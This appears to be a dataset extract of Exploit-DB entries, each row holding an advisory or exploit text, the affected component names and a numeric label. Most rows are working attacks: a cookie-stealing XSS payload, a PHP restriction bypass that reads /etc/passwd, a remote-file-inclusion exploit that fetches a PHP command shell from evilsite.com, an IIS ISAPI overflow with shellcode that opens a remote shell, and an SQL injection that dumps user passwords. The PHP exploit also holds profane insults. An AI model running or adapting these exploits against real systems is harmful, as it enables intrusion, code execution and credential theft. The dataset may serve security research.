plug=0&mapname=test&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&link_commentin=&link_commentposin=95&link_commentout=&link_commentposout=5&map_title=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&map_legend=Traffic+Load&map_stamp=Created%3A+%25b+%25d+%25Y+%25H%3A%25M%3A%25S&map_linkdefaultwidth=7&map_linkdefaultbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&map_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=overlib&mapstyle_arrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyle_legendfont=4&item_configtext=&editorsettings_showvias=0&editorsettings_showrelative=0&editorsettings_gridsnap=NO  Then display the titles: GET editor.php  VERSIONS AFFECTED  Tested with version 0.97a (current release) but earlier versions are possibly vulnerable.  SOLUTION  There is no official patch currently available.  NOTES  The Common Vulnerabilities and Exposures (CVE) project has assigned the name CVE-2013-2618 to this issue. This is a candidate for inclusion in the CVE list (http://cve.mitre.org), which standardizes names for security problems.  CREDITS  Daniel Ricardo dos Santos SEC+ Information Security Company - http://www.secplus.com.br/","[""'editor.php'"", 'editor.php?action=newfile']",1
32740,"QNX RTOS 6.4 - '.ELF' Binary File Local Denial of Service source: https://www.securityfocus.com/bid/33352/info  QNX RTOS is prone to a local denial-of-service vulnerability.  Attackers can exploit this issue to cause a kernel panic, denying service to legitimate users.  QNX RTOS 6.4.0 is vulnerable; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32740.bin","[""'.ELF'""]",0
28504,"PHP 3 < 5 - Ini_Restore() 'Safe_mode' / 'open_basedir' Restriction Bypass source: https://www.securityfocus.com/bid/19933/info  PHP is prone to a 'safe_mode' and 'open_basedir' restriction-bypass vulnerability. Successful exploits could allow an attacker to access sensitive information or to write files in unauthorized locations.  This vulnerability would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code; in such cases, the 'safe_mode' and 'open_basedir' restrictions are expected to isolate users from each other.  These issues are reported to affect PHP versions 5.1.6, 4.4.4, and earlier.  Reports indicate that fixes may be available to address this issue, but this has not been confirmed.  <? echo ini_get(""safe_mode""); echo ini_get(""open_basedir""); include(""/etc/passwd""); ini_restore(""safe_mode""); ini_restore(""open_basedir""); echo ini_get(""safe_mode""); echo ini_get(""open_basedir""); include(""/etc/passwd""); ?>","[""'open_basedir'"", ""'safe_mode'""]",1
47671,"Foscam Video Management System 1.1.4.9 - 'Username' Denial of Service (PoC) # Exploit Title: Foscam Video Management System 1.1.4.9 - 'Username' Denial of Service (PoC) # Author: chuyreds # Discovery Date: 2019-11-16 # Vendor Homepage: https://www.foscam.es/ # Software Link : https://www.foscam.es/descarga/FoscamVMS_1.1.4.9.zip # Tested Version: 1.1.4.9 # Vulnerability Type: Denial of Service (DoS) Local # Tested on OS: Windows 10 Pro x64 es  # Steps to Produce the Crash:  # 1.- Run python code : python foscam-vms-uid-dos.py # 2.- Open FoscamVMS1.1.4.9.txt and copy its content to clipboard # 3.- Open FoscamVMS # 4.- Go to Add Device # 5.- Choose device type ""NVR""/""IPC"" # 6.- Copy the content of the file into Username # 7.- Click on Login Check # 8.- Crashed   buffer = ""\x41"" * 520 f = open (""FoscamVMS_1.1.4.9.txt"", ""w"") f.write(buffer) f.close()","[""'Username'""]",1
2944,"VerliAdmin 0.3 - 'index.php' Remote File Inclusion <?     /* P.S Chcialem serdecznie niepozdrowic wszystkie kurwy takie jak Ne0 i jego dziwki!! Mam was w dupie, a Ty Ne0 pryszczu jebany pogodz sie z porazka bo to ja zawsze bede lepszy od Ciebie! Nie pozdrawiam tez wszystkie gnidy jakie chowaja sie na swoich smiesznych hubach DC, jestescie poprostu smieszni... Cale to ZOO pozdrawiam srodkowym palcem H.W.D.Cale Direct Connect PL   by Kacper & DEVIL TEAM */        //Kacper Settings  $exploit_name = ""VerliAdmin <= 0.3 File Include Exploit""; $script_name = ""VerliAdmin 0.3""; $script_site = ""http://bohyn.czechweb.cz/""; $dork = 'allinurl:""verliadmin""'; //**************************************************************   print	    - - [DEVIL TEAM THE BEST POLISH TEAM] - -    [Exploit name: '.$exploit_name.' [Script name: '.$script_name.' [Script site: '.$script_site.' dork: '.$dork.'  Find by: Kacper (a.k.a Rahim)   ========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <======== ========>         http://www.rahim.webd.pl/            <========  Contact: kacper1964@yahoo.pl  (c)od3d by Kacper -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Greetings DragonHeart and all DEVIL TEAM Patriots :) - Leito & Leon | friend str0ke ;)  Blund Coder, D0han, d3m0n, D3m0n (ziom z Niemiec :P), dn0de, DUREK5, fdj, Grzegorz, GrZyB997, konsol, Mandr4ke, mass, michalind, mIvus, Nua, nukedclx, pepi, QunZ, Qw3rty, RebeL, SkD, Adam, arkadius, asteroid, blue, Ci2u, CrazzyIwan, DMX, drzewko, ExTrEmE][-][ack, Gelo, Kicaj, Larry, Leito, LEON, Michas, Morpheus, MXZ, Ramzes, redsaq, TomZen   and   Dr Max Virus TamTurk, hackersecurity.org  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-                 Greetings for 4ll Fusi0n Group members ;-)                 and all members of hacker.com.pl ;) -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ';  if ($argc<6) { print (' -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Usage: php '.$argv[0].' host shell nick pass cmd OPTIONS host:      script server (ip/hostname) shell:     path to shell nick:      You username in hub pass:      You username password cmd:       a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' localhost http://www.evilsite.com/shell.txt Hauru zamek ls -la -P1.1.1.1:80 shell.txt: <?php ob_clean();echo""Hacker_Kacper_Made_in_Poland!!..Hauru..^_^..the..best..polish..team..Greetz"";ini_set(""max_execution_time"",0);echo ""hauru"";passthru($_GET[""cmd""]);die;?> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- '); die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpackets($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $shell=$argv[2]; $nick=$argv[3]; $password=$argv[4]; $cmd="""";  $port=80; $proxy=""""; for ($i=5; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } }  if ($proxy=='') {$p='http://'.$host.':'.$port;}  $num1 = Rand(97, 122); $num2 = Rand(65, 90); $pass = Crypt($password, Chr($num1).Chr($num2));  $packet =""GET "".$p.""index.php?q="".$shell.""?cmd="".$cmd.""%00 HTTP/1.0\r\n""; $pakiet.=""Cookie: brwsr_tp=Opera;\r\n""; $pakiet.=""Cookie: lang=pl;\r\n""; $pakiet.=""Cookie: login=1;\r\n""; $pakiet.=""Cookie: nick="".$nick."";\r\n""; $pakiet.=""Cookie: password="".$pass."";\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpackets($packet); if (strstr($html,""hauru"")) { $temp=explode(""hauru"",$html); die($temp[1]); } echo ""Exploit err0r :(\n""; echo ""Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\n""; ?>  # milw0rm.com [2006-12-18]","[""'index.php'""]",1
20932,"Microsoft Index Server 2.0 / Indexing Service (Windows 2000) - ISAPI Extension Buffer Overflow (3) # source: https://www.securityfocus.com/bid/2880/info #    # Windows Index Server ships with Windows NT 4.0 Option Pack; Windows Indexing Service ships with Windows 2000. An unchecked buffer resides in the 'idq.dll' ISAPI extension associated with each service. A maliciously crafted request could allow arbitrary code to run on the host in the Local System context. #    # Note that Index Server and Indexing Service do not need to be running for an attacker to exploit this issue. Since 'idq.dll' is installed by default when IIS is installed, IIS would need to be the only service running. #    # Note also that this vulnerability is currently being exploited by the 'Code Red' worm. In addition, all products that run affected versions of IIS are also vulnerable. #   #!/bin/sh # .ida nasty exploit # mat@hacksware.com,mat@monkey.org # http://monkey.org/~mat # # If this exploit succeeds, you can get into the machine through port 8008 # shellcode generated by DeepZone generator # I only tested this code under W2k Korean Version, so the offset value may vary through systems, you can get the offset value with WinDbg tool included in Windows SDK # # How to get the offset: # 1. start windbg and attach to inetinfo.exe process. and go(F5) # 2. using this script attack the test machine # 3. if the offset in this script is not valid, then inetinfo.exe will be got break. # 4. you can search the shellcode position with following command #     s 10000 Lfffff 0x68 0x5e 0x56 0xc3 0x90 # 5. if the shellcode position is 0xaabbccdd #    then you can change the %u...%u...to %uccdd%uaabb  target=$1 SHELLCODE=`printf ""\x68\x5e\x56\xc3\x90\x54\x59\xff\xd1\x58\x33\xc9\xb1\x1c\x90\x90\x90\x90\x03\xf1\x56\x5f\x33\xc9\x66\xb9\x95\x04\x90\x90\x9 0\xac\x34\x99\xaa\xe2\xfa\x71\x99\x99\x99\x99\xc4\x18\x74\x40\xb8\xd9\x99\x14\x2c\x6b\xbd\xd9\x99\x14\x24\x63\xbd\xd9\x99\xf 3\x9e\x09\x09\x09\x09\xc0\x71\x4b\x9b\x99\x99\x14\x2c\xb3\xbc\xd9\x99\x14\x24\xaa\xbc\xd9\x99\xf3\x93\x09\x09\x09\x09\xc0\x7 1\x23\x9b\x99\x99\xf3\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x7c\xbc\xd9\x99\xcf\x14\x2c\x70\xbc\xd9\x99\xcf\x66\x0c\xaa\xb c\xd9\x99\xf3\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x74\xbc\xd9\x99\xcf\x14\x2c\x68\xbc\xd9\x99\xcf\x66\x0c\xaa\xbc\xd9\x9 9\x5e\x1c\x6c\xbc\xd9\x99\xdd\x99\x99\x99\x14\x2c\x6c\xbc\xd9\x99\xcf\x66\x0c\xae\xbc\xd9\x99\x14\x2c\xb4\xbf\xd9\x99\x34\xc 9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\xa8\xbf\xd9\x99\x34\xc9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\x68\xbc\xd9\x99\x14\x24\xb4\xbf\xd 9\x99\x3c\x14\x2c\x7c\xbc\xd9\x99\x34\x14\x24\xa8\xbf\xd9\x99\x32\x14\x24\xac\xbf\xd9\x99\x32\x5e\x1c\xbc! \xbf\xd9\x99\x99\x99\x99\x99\x5e\x1c\xb8\xbf\xd9\x99\x98\x98\x99\x99\x14\x2c\xa0\xbf\xd9\x99\xcf\x14\x2c\x6c\xbc\xd9\x99\xcf \xf3\x99\xf3\x99\xf3\x89\xf3\x98\xf3\x99\xf3\x99\x14\x2c\xd0\xbf\xd9\x99\xcf\xf3\x99\x66\x0c\xa2\xbc\xd9\x99\xf1\x99\xb9\x99 \x99\x09\xf1\x99\x9b\x99\x99\x66\x0c\xda\xbc\xd9\x99\x10\x1c\xc8\xbf\xd9\x99\xaa\x59\xc9\xd9\xc9\xd9\xc9\x66\x0c\x63\xbd\xd9 \x99\xc9\xc2\xf3\x89\x14\x2c\x50\xbc\xd9\x99\xcf\xca\x66\x0c\x67\xbd\xd9\x99\xf3\x9a\xca\x66\x0c\x9b\xbc\xd9\x99\x14\x2c\xcc \xbf\xd9\x99\xcf\x14\x2c\x50\xbc\xd9\x99\xcf\xca\x66\x0c\x9f\xbc\xd9\x99\x14\x24\xc0\xbf\xd9\x99\x32\xaa\x59\xc9\x14\x24\xfc \xbf\xd9\x99\xce\xc9\xc9\xc9\x14\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xa9\x66\x0c\xd6\xbc\xd9\x99\x72\xd4 \x09\x09\x09\xaa\x59\xc9\x14\x24\xfc\xbf\xd9\x99\xce\xc9\xc9\xc9\x14\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3 \xa9\x66\x0c\xd6\xbc\xd9\x99\x1a\x24\xfc\xbf\xd9\x99\x9b\x96\x1b\x8e\x98\x99\x99\x18\x24\xfc\xbf\xd9\x99\x98\xb9\x99\x99\xe! b\x97\x09\x09\x09\x09\x5e\x1c\xfc\xbf\xd9\x99\x99\xb9\x99\x99\xf3\x99\x12\x1c\xfc\xbf\xd9\x99\x14\x24\xfc\xbf\xd9\x99\xce\xc 9\x12\x1c\xc8\xbf\xd9\x99\xc9\x14\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c\xde\xbc\xd9\x99\xf3\xa9\x66\x0c\xd6\xbc\xd9\x99\x12\x1 c\xfc\xbf\xd9\x99\xf3\x99\xc9\x14\x2c\xc8\xbf\xd9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66\x0c\x93\xbc\xd9\x99\xf3\x9 9\x14\x24\xfc\xbf\xd9\x99\xce\xf3\x99\xf3\x99\xf3\x99\x14\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xa9\x66\x0 c\xd6\xbc\xd9\x99\xaa\x50\xa0\x14\xfc\xbf\xd9\x99\x96\x1e\xfe\x66\x66\x66\xf3\x99\xf1\x99\xb9\x99\x99\x09\x14\x2c\xc8\xbf\xd 9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66\x0c\x97\xbc\xd9\x99\x10\x1c\xf8\xbf\xd9\x99\xf3\x99\x14\x24\xfc\xbf\xd9\x9 9\xce\xc9\x14\x2c\xc8\xbf\xd9\x99\x34\xc9\x14\x2c\x74\xbc\xd9\x99\x34\xc9\x66\x0c\xd2\xbc\xd9\x99\xf3\xa9\x66\x0c\xd6\xbc\xd 9\x99\xf3\x99\x12\x1c\xf8\xbf\xd9\x99\x14\x24\xfc\xbf\xd9\x99\xce\xc9\x12\x1c\xc8\xbf\xd9\x99\xc9\x14\x2c\x70\xbc\xd9\x99\x! 34\xc9\x66\x0c\xde\xbc\xd9\x99\xf3\xa9\x66\x0c\xd6\xbc\xd9\x99\x70\x20\x67\x66\x66\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66\x0c\x 8b\xbc\xd9\x99\x14\x2c\xc4\xbf\xd9\x99\x34\xc9\x66\x0c\x8b\xbc\xd9\x99\xf3\x99\x66\x0c\xce\xbc\xd9\x99\xc8\xcf\xf1\xe5\x89\x 99\x98\x09\xc3\x66\x8b\xc9\xc2\xc0\xce\xc7\xc8\xcf\xca\xf1\xad\x89\x99\x98\x09\xc3\x66\x8b\xc9\x35\x1d\x59\xec\x62\xc1\x32\x c0\x7b\x70\x5a\xce\xca\xd6\xda\xd2\xaa\xab\x99\xea\xf6\xfa\xf2\xfc\xed\x99\xfb\xf0\xf7\xfd\x99\xf5\xf0\xea\xed\xfc\xf7\x99\x f8\xfa\xfa\xfc\xe9\xed\x99\xea\xfc\xf7\xfd\x99\xeb\xfc\xfa\xef\x99\xfa\xf5\xf6\xea\xfc\xea\xf6\xfa\xf2\xfc\xed\x99\xd2\xdc\x cb\xd7\xdc\xd5\xaa\xab\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xf0\xe9\xfc\x99\xde\xfc\xed\xca\xed\xf8\xeb\xed\xec\xe9\xd0\xf7\xff\x f6\xd8\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc\xea\xea\xd8\x99\xc9\xfc\xfc\xf2\xd7\xf8\xf4\xfc\xfd\xc9\xf0\xe9\xfc\x 99\xde\xf5\xf6\xfb\xf8\xf5\xd8\xf5\xf5\xf6\xfa\x99\xcb\xfc\xf8\xfd\xdf\xf0\xf5\xfc\x99\xce\xeb\xf0\xed\xfc\xdf\xf0\xf5\xfc\! x99\xca\xf5\xfc\xfc\xe9\x99\xda\xf5\xf6\xea\xfc\xd1\xf8\xf7\xfd\xf5\xfc\x99\xdc\xe1\xf0\xed\xc9\xeb\xf6\xfa\xfc\xea\xea\x99\ xda\xf6\xfd\xfc\xfd\xb9\xfb\xe0\xb9\xe5\xc3\xf8\xf7\xb9\xa5\xf0\xe3\xf8\xf7\xd9\xfd\xfc\xfc\xe9\xe3\xf6\xf7\xfc\xb7\xf6\xeb\ xfe\xa7\x9b\x99\x86\xd1\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x95\x99\x99\x99\x99\x99\x99\x99\x98\x99\x99\x99\x99\ x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\ x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\ x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\ x99\x99\x99\x99\x99\x99\xda\xd4\xdd\xb7\xdc\xc1\xdc\x99\x99\x99\x99\x99\x89\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\ x99\x99\x99\x99\x99\x99\x99\x90\x90\x90\x90\x90\x90\x90\x90""` #for w2k no sp: #GET_LINE=""GET /test.ida?`perl -e 'print ""N""x230'`%u0101%u00b5%u0101%u00b5%u0101%u00b5%u0101%u00b5=x HTTP/1.0"" #for w2k sp2: GET_LINE=""GET /test.ida?`perl -e 'print ""N""x230'`%u0abf%u00b6%u0abf%u00b6%u0abf%u00b6%u0abf%u00b6=x HTTP/1.0"" nc $target 80 <<EOF `echo $GET_LINE` yahoo: `perl -e 'print ""\x90""x11800'`$SHELLCODE  EOF","['ISAPI', ""'idq.dll'""]",1
26360,MySource 2.14 - 'edit_table_props.php?bgcolor' Cross-Site Scripting source: https://www.securityfocus.com/bid/15132/info       MySource is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.       An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/squizlib/bodycopy/pop_ups/edit_table_props.php?bgcolor=</style>[code],"[""'edit_table_props.php?bgcolor'""]",1
9171,"VS PANEL 7.5.5 - 'results.php?Cat_ID' SQL Injection   ####################################   # Homepage: http://www.vspanel.gr/ #   # Product: VS PANEL v.7.5.5        #   # DeScOvRed By:C0D3R-Dz            #   # File: results.php                #   # ContACt:cD_@LinUxmAIL.OrG        #   # Dork: ""Powered by VS PANEL 7.5.5""#   ################################### ################################### SQL Injection##################################### # results.php?Cat_ID=-6+union+select+1,concat(username,0x3a,password),3,4+from+Users--# #######################################################################################   ################################### DeMo ############################################################ #www.vspanel.gr/results.php?Cat_ID=-6+union+select+1,concat(username,0x3a,password),3,4+from+Users--# #####################################################################################################   ######################################### #Greetz to:His0K4-HouSsem_PHp-HacKdZ    # #                 IncluDeR              # #########################################   # milw0rm.com [2009-07-16]","[""'results.php?Cat_ID'""]",1
42546,"libgig 4.0.0 (LinuxSampler) - Multiple Vulnerabilities ================ Author : qflb.wu ===============   Introduction: ============= https://www.linuxsampler.org/libgig/ libgig is a C++ library for loading, modifying existing and creating new Gigasampler (.gig) files and DLS (Downloadable Sounds) Level 1/2 files, KORG sample based instruments (.KSF and .KMP files), SoundFont v2 (.sf2) files and AKAI sampler data.    Affected version: ===== 4.0.0   Vulnerability Description: ========================== 1. the gig::Region::Region function in gig.cpp in libgig 4.0.0 can cause a denial of service(Null pointer dereference and application crash) via a crafted gig file.   ./gigdump libgig_4.0.0_null_pointer_dereference_1.gig   ----debug info:---- Program received signal SIGSEGV, Segmentation fault. 0x00007ffff7bc07df in gig::Region::Region (this=0x614ce0,      pInstrument=<optimized out>, rgnList=0x610230) at gig.cpp:2970 2970                    if (file->pWavePoolTable) pDimensionRegions[i]->pSample = GetSampleFromWavePool(wavepoolindex); (gdb) bt #0  0x00007ffff7bc07df in gig::Region::Region (this=0x614ce0,      pInstrument=<optimized out>, rgnList=0x610230) at gig.cpp:2970 #1  0x00007ffff7bc0b36 in gig::Instrument::Instrument (this=0x60ef80,      pFile=<optimized out>, insList=0x60eea0, pProgress=0x7fffffffdda0)     at gig.cpp:4404 #2  0x00007ffff7bc103e in gig::File::LoadInstruments (this=0x609160,      pProgress=0x0) at gig.cpp:5576 #3  0x00007ffff7bbade6 in gig::File::GetFirstInstrument (     this=this@entry=0x609160) at gig.cpp:5378 #4  0x000000000040533b in PrintInstruments (gig=gig@entry=0x609160)     at gigdump.cpp:205 #5  0x0000000000401f34 in main (argc=<optimized out>, argv=<optimized out>)     at gigdump.cpp:79 (gdb) disassemble 0x00007ffff7bc07ca,0x00007ffff7bc07f0 Dump of assembler code from 0x7ffff7bc07ca to 0x7ffff7bc07f0:    0x00007ffff7bc07ca <gig::Region::Region(gig::Instrument*, RIFF::List*)+666>:je     0x7ffff7bc07e3 <gig::Region::Region(gig::Instrument*, RIFF::List*)+691>    0x00007ffff7bc07cc <gig::Region::Region(gig::Instrument*, RIFF::List*)+668>:xor    %edx,%edx    0x00007ffff7bc07ce <gig::Region::Region(gig::Instrument*, RIFF::List*)+670>:mov    %eax,%esi    0x00007ffff7bc07d0 <gig::Region::Region(gig::Instrument*, RIFF::List*)+672>:mov    %rbx,%rdi    0x00007ffff7bc07d3 <gig::Region::Region(gig::Instrument*, RIFF::List*)+675>:mov    0x138(%r13),%r14    0x00007ffff7bc07da <gig::Region::Region(gig::Instrument*, RIFF::List*)+682>:callq  0x7ffff7b9ede0 <_ZN3gig6Region21GetSampleFromWavePoolEjPN4RIFF10progress_tE@plt> => 0x00007ffff7bc07df <gig::Region::Region(gig::Instrument*, RIFF::List*)+687>:mov    %rax,0x38(%r14)    0x00007ffff7bc07e3 <gig::Region::Region(gig::Instrument*, RIFF::List*)+691>:add    $0x1,%ebp    0x00007ffff7bc07e6 <gig::Region::Region(gig::Instrument*, RIFF::List*)+694>:add    $0x8,%r13    0x00007ffff7bc07ea <gig::Region::Region(gig::Instrument*, RIFF::List*)+698>:cmp    %ebp,0x130(%rbx) End of assembler dump. (gdb) i r rax            0x60ca906343312 rbx            0x614ce06376672 rcx            0x33 rdx            0x60a3006333184 rsi            0x00 rdi            0x6091606328672 rbp            0x00x0 rsp            0x7fffffffdcc00x7fffffffdcc0 r8             0x00 r9             0x22 r10            0x00 r11            0x246582 r12            0x6159506379856 r13            0x614ce06376672 r14            0x00 r15            0x00 rip            0x7ffff7bc07df0x7ffff7bc07df <gig::Region::Region(gig::Instrument*, RIFF::List*)+687> eflags         0x10246[ PF ZF IF RF ] cs             0x3351 ss             0x2b43 ds             0x00 es             0x00 ---Type <return> to continue, or q <return> to quit--- fs             0x00 gs             0x00 (gdb)    ASAN:SIGSEGV ================================================================= ==40516== ERROR: AddressSanitizer: SEGV on unknown address 0x000000000038 (pc 0x7f4f87126260 sp 0x7ffd0b22ec80 bp 0x600e0000c3b0 T0) AddressSanitizer can not provide additional info.     #0 0x7f4f8712625f in gig::Region::Region(gig::Instrument*, RIFF::List*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:2970     #1 0x7f4f87127f4a in gig::Instrument::Instrument(gig::File*, RIFF::List*, RIFF::progress_t*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:4404     #2 0x7f4f87129fdc in gig::File::LoadInstruments(RIFF::progress_t*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:5576     #3 0x7f4f870fb6a0 in gig::File::GetFirstInstrument() /home/a/Documents/libgig-4.0.0/src/gig.cpp:5378     #4 0x40fca6 in PrintInstruments(gig::File*) /home/a/Documents/libgig-4.0.0/src/tools/gigdump.cpp:205     #5 0x4027aa in main /home/a/Documents/libgig-4.0.0/src/tools/gigdump.cpp:79     #6 0x7f4f86749ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)     #7 0x402e5c in _start (/home/a/Documents/libgig-4.0.0/src/tools/.libs/gigdump+0x402e5c) SUMMARY: AddressSanitizer: SEGV /home/a/Documents/libgig-4.0.0/src/gig.cpp:2970 gig::Region::Region(gig::Instrument*, RIFF::List*) ==40516== ABORTING   POC: libgig_4.0.0_null_pointer_dereference_1.gig CVE: CVE-2017-12950   2. the gig::DimensionRegion::CreateVelocityTable function in gig.cpp in libgig 4.0.0 can cause a denial of service(stack buffer overflow and application crash) via a crafted gig file.   ./gigdump libgig_4.0.0_stack_buffer_overflow.gig   ----debug info:---- Program received signal SIGSEGV, Segmentation fault. 0x00007ffff7bb8b44 in gig::DimensionRegion::CreateVelocityTable (     this=<optimized out>, curveType=<optimized out>, depth=<optimized out>,      scaling=<optimized out>) at gig.cpp:2884 2884        table[0] = 0; (gdb) bt #0  0x00007ffff7bb8b44 in gig::DimensionRegion::CreateVelocityTable (     this=<optimized out>, curveType=<optimized out>, depth=<optimized out>,      scaling=<optimized out>) at gig.cpp:2884 #1  0x00007ffff7bbf535 in gig::DimensionRegion::GetVelocityTable (     this=<optimized out>, curveType=<optimized out>, depth=<optimized out>,      scaling=<optimized out>) at gig.cpp:2054 #2  0x00007ffff7bbf6f3 in gig::DimensionRegion::GetCutoffVelocityTable (     this=this@entry=0x60d3f0, vcfVelocityCurve=<optimized out>,      vcfVelocityDynamicRange=<optimized out>, vcfVelocityScale=<optimized out>,      vcfCutoffController=<optimized out>) at gig.cpp:2042 #3  0x00007ffff7bbffa4 in gig::DimensionRegion::DimensionRegion (     this=0x60d3f0, pParent=<optimized out>, _3ewl=<optimized out>)     at gig.cpp:1617 #4  0x00007ffff7bc0464 in gig::Region::LoadDimensionRegions (     this=this@entry=0x60c3a0, rgn=rgn@entry=0x60b330) at gig.cpp:3075 #5  0x00007ffff7bc05fc in gig::Region::Region (this=0x60c3a0,      pInstrument=<optimized out>, rgnList=0x60b330) at gig.cpp:2923 #6  0x00007ffff7bc0b36 in gig::Instrument::Instrument (this=0x60a280,      pFile=<optimized out>, insList=0x60a1a0, pProgress=0x7fffffffdd90)     at gig.cpp:4404 #7  0x00007ffff7bc103e in gig::File::LoadInstruments (this=0x609160,      pProgress=0x0) at gig.cpp:5576 #8  0x00007ffff7bbade6 in gig::File::GetFirstInstrument ( ---Type <return> to continue, or q <return> to quit---     this=this@entry=0x609160) at gig.cpp:5378 #9  0x000000000040533b in PrintInstruments (gig=gig@entry=0x609160)     at gigdump.cpp:205 #10 0x0000000000401f34 in main (argc=<optimized out>, argv=<optimized out>)     at gigdump.cpp:79     (gdb) disassemble Dump of assembler code for function gig::DimensionRegion::CreateVelocityTable(gig::curve_type_t, unsigned char, unsigned char): ...    0x00007ffff7bb8b27 <+2119>:mov    0x2e0(%rsp,%rdx,8),%rsi    0x00007ffff7bb8b2f <+2127>:je     0x7ffff7bb8c5c <gig::DimensionRegion::CreateVelocityTable(gig::curve_type_t, unsigned char, unsigned char)+2428>    0x00007ffff7bb8b35 <+2133>:movzbl %bpl,%ebx    0x00007ffff7bb8b39 <+2137>:cvtsi2sd %ebx,%xmm6    0x00007ffff7bb8b3d <+2141>:movq   $0x0,(%rax) => 0x00007ffff7bb8b44 <+2148>:mov    0x8(%rsi),%edi    0x00007ffff7bb8b47 <+2151>:lea    0x8(%rax),%rcx ---Type <return> to continue, or q <return> to quit---    0x00007ffff7bb8b4b <+2155>:mov    0xc(%rsi),%r10d    